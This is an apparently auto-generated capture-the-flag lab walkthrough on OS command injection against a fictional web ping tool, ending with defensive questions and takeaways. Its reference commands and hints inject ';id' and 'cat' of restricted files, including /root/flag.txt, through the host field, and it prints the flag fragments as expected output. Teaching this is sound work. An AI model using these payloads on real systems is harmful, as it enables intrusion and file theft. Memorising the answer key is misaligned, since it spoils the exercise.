# CloudPing Diagnostics - Command Injection

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `web-2-3-command-injection/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **CloudPing Diagnostics - Command Injection** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **40 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

CloudPing Diagnostics offers a web-based network diagnostic tool that
customers use to test connectivity to their cloud infrastructure. The tool
accepts a hostname or IP address and runs a ping test, displaying the
results in the browser.

Tom Bradley (Lead Developer) built the tool as a weekend project: "It's
just a simple wrapper around the ping command. Takes the hostname, runs
ping, shows the output. Nothing fancy."

Your assessment scope covers the diagnostic tool and the underlying server.
Two tokens have been placed on the system - one accessible through basic
command injection and one requiring deeper filesystem access.

## Your Objectives

- Identify a web application feature that interacts with the operating system
- Test for OS command injection using shell metacharacters
- Exploit command injection to execute arbitrary commands on the server
- Read restricted files through injected commands
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Web application responds**

```bash
curl -s http://<target>/ | grep -ci ping
```

Expected: `success`

**Normal ping works**

```bash
curl -s -X POST http://<target>/ping -d 'host=127.0.0.1' | grep -c 'bytes from'
```

Expected: `success`

**Command injection executes id**

```bash
curl -s -X POST http://<target>/ping -d 'host=127.0.0.1;id' | grep -c uid
```

Expected: `1`

**Extract token 1 via command injection**

```bash
curl -s -X POST http://<target>/ping -d 'host=127.0.0.1;cat /opt/cloudping/config/token.txt' | grep -E '^[a-z0-9_]+$' | head -1
```

Expected: `cmd`

**Extract token 2 via command injection**

```bash
curl -s -X POST http://<target>/ping -d 'host=127.0.0.1;cat /root/flag.txt' | grep -E '^[a-z0-9_]+$' | head -1
```

Expected: `1nj3ct3d`

**Verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

Use the ping tool normally first. Enter a valid IP like 127.0.0.1 and
observe the output. The tool is running an OS command on the server.
What happens if you add shell metacharacters to the input? Try semicolons,
pipes, or backticks after the IP.

</details>

<details><summary>Hint 2 (unlocks after 16 minutes)</summary>

Try: 127.0.0.1; id  or  127.0.0.1 | id  or  127.0.0.1 && id
If you see the output of the "id" command, you have command injection.
Now use it to explore the filesystem and find the tokens.

</details>

<details><summary>Hint 3 (unlocks after 22 minutes)</summary>

Token 1: 127.0.0.1; cat /opt/cloudping/config/token.txt
Token 2: 127.0.0.1; cat /root/flag.txt
Assemble: OCR{token1_token2}

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Validate and encode input at the server, enforce authorization on every object, and monitor unusual request patterns.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
